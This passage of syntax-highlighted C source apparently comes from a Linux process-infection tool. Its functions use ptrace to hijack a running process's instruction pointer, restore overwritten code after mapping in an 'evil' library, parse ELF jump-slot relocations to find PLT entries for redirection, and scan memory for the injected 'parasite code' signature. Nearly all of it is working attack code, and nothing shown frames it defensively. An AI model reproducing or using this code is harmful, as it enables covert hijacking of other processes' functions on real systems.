&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>Setting %%eip to 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, offset<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = offset + <span style="color: #cc66cc;">2</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_CONT, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* check where eip is now at */</span>&nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%%eip is now at 0x%x, resetting it to 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, reg.<span style="color: #202020;">eip</span>, eip<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"inserting original code back<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>j = <span style="color: #cc66cc;">0</span>, i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">90</span>; i += <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; buf<span style="color: black;">[</span>j++<span style="color: black;">]</span> = ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, <span style="color: black;">(</span>offset + i<span style="color: black;">)</span>, *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span><span style="color: black;">(</span>saved_text + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* get base addr of our mmap'd lib */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; evil_base = reg.<span style="color: #202020;">eax</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = eip;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = eax;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = ebx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ecx</span> = ecx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">edx</span> = edx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">esp</span> = esp;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ptrace<span style="color: black;">(</span>PTRACE_DETACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">-1</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"ptrace_detach"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
<span style="color: black;">}</span><br>
<br>
<span style="color: #808080; font-style: italic;">/* this parses/pulls the R_386_JUMP_SLOT relocation entries from our process */</span><br>
<br>
<span style="color: #993333;">struct</span> linking_info * get_plt<span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *mem<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Ehdr *ehdr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Shdr *shdr, *shdrp, *symshdr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Sym *syms, *symsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Rel *rel;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> *symbol;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i, j, symcount, k;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> linking_info *link;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ehdr = <span style="color: black;">(</span>Elf32_Ehdr *<span style="color: black;">)</span>mem;<br>
&nbsp; &nbsp; &nbsp; &nbsp; shdr = <span style="color: black;">(</span>Elf32_Shdr *<span style="color: black;">)</span><span style="color: black;">(</span>mem + ehdr-&gt;e_shoff<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; shdrp = shdr;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = ehdr-&gt;e_shnum; i-- &gt; <span style="color: #cc66cc;">0</span>; shdrp++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>shdrp-&gt;sh_type == SHT_DYNSYM<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; symshdr = &amp;shdr<span style="color: black;">[</span>shdrp-&gt;sh_link<span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>symbol = malloc<span style="color: black;">(</span>symshdr-&gt;sh_size<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> fatal;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memcpy<span style="color: black;">(</span>symbol, <span style="color: black;">(</span>mem + symshdr-&gt;sh_offset<span style="color: black;">)</span>, symshdr-&gt;sh_size<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>syms = <span style="color: black;">(</span>Elf32_Sym *<span style="color: black;">)</span>malloc<span style="color: black;">(</span>shdrp-&gt;sh_size<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> fatal;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memcpy<span style="color: black;">(</span><span style="color: black;">(</span>Elf32_Sym *<span style="color: black;">)</span>syms, <span style="color: black;">(</span>Elf32_Sym *<span style="color: black;">)</span><span style="color: black;">(</span>mem + shdrp-&gt;sh_offset<span style="color: black;">)</span>, shdrp-&gt;sh_size<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; symsp = syms;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; symcount = <span style="color: black;">(</span>shdrp-&gt;sh_size / <span style="color: #993333;">sizeof</span><span style="color: black;">(</span>Elf32_Sym<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; link = <span style="color: black;">(</span><span style="color: #993333;">struct</span> linking_info *<span style="color: black;">)</span>malloc<span style="color: black;">(</span><span style="color: #993333;">sizeof</span><span style="color: black;">(</span><span style="color: #993333;">struct</span> linking_info<span style="color: black;">)</span> * symcount<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!link<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> fatal;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; link<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span>.<span style="color: #202020;">count</span> = symcount;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>j = <span style="color: #cc66cc;">0</span>; j &lt; symcount; j++, symsp++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; strncpy<span style="color: black;">(</span>link<span style="color: black;">[</span>j<span style="color: black;">]</span>.<span style="color: #202020;">name</span>, &amp;symbol<span style="color: black;">[</span>symsp-&gt;st_name<span style="color: black;">]</span>, <span style="color: #993333;">sizeof</span><span style="color: black;">(</span>link<span style="color: black;">[</span>j<span style="color: black;">]</span>.<span style="color: #202020;">name</span><span style="color: black;">)</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!link<span style="color: black;">[</span>j<span style="color: black;">]</span>.<span style="color: #202020;">name</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> fatal;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; link<span style="color: black;">[</span>j<span style="color: black;">]</span>.<span style="color: #202020;">index</span> = j;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = ehdr-&gt;e_shnum; i-- &gt; <span style="color: #cc66cc;">0</span>; shdr++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">switch</span><span style="color: black;">(</span>shdr-&gt;sh_type<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> SHT_REL:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;rel = <span style="color: black;">(</span>Elf32_Rel *<span style="color: black;">)</span><span style="color: black;">(</span>mem + shdr-&gt;sh_offset<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">(</span>j = <span style="color: #cc66cc;">0</span>; j &lt; shdr-&gt;sh_size; j += <span style="color: #993333;">sizeof</span><span style="color: black;">(</span>Elf32_Rel<span style="color: black;">)</span>, rel++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>k = <span style="color: #cc66cc;">0</span>; k &lt; symcount; k++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ELF32_R_SYM<span style="color: black;">(</span>rel-&gt;r_info<span style="color: black;">)</span> == link<span style="color: black;">[</span>k<span style="color: black;">]</span>.<span style="color: #202020;">index</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; link<span style="color: black;">[</span>k<span style="color: black;">]</span>.<span style="color: #202020;">offset</span> = rel-&gt;r_offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> SHT_RELA:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">default</span>:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> link;<br>
&nbsp; &nbsp; &nbsp; &nbsp; fatal:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #000000; font-weight: bold;">NULL</span>;<br>
<span style="color: black;">}</span><br>
<br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> search_evil_lib<span style="color: black;">(</span><span style="color: #993333;">int</span> pid, <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> vaddr<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *buf;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i = <span style="color: #cc66cc;">0</span>, ret;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> j = <span style="color: #cc66cc;">0</span>, c = <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> evilvaddr = <span style="color: #cc66cc;">0</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>buf = malloc<span style="color: black;">(</span>LIBSIZE<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"malloc"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ret = memrw<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>buf, vaddr, LIBSIZE, pid, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Searching at library base [0x%x] for evil function<span style="color: #000099; font-weight: bold;">\n</span>"</span>, vaddr<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; LIBSIZE; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>buf<span style="color: black;">[</span>i<span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+1</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+2</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+3</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+4</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+5</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">5</span><span style="color: black;">]</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+6</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">6</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+7</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">7</span><span style="color: black;">]</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp;evilvaddr = <span style="color: black;">(</span>vaddr + i<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; c = <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; j = evilvaddr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Printing parasite code -&gt;<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">(</span>j++ &lt; evilvaddr + <span style="color: #cc66cc;">50</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>c++ % <span style="color: #cc66cc;">20</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%.2x "</span>, buf<span style="color: black;">[</span>i++<span style="color: black;">]</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>evilvaddr<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: black;">(</span>evilvaddr<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">0</span>;<br>
<span style="color: black;">}</span><br>
<br>
<span style="color: #993333;">int</span> check_for_lib<span style="color: black;">(</span><span style="color: #993333;">char</span> *lib, FILE *fd<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> buf<span style="color: black;">[</span>MAXBUF<span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">while</span><span style="color: black;">(</span>fgets<span style="color: black;">(</span>buf, MAXBUF<span style="color: #cc66cc;">-1</span>, fd<span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>strstr<span style="color: black;">(</span>buf, lib<span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">1</span>;<br>
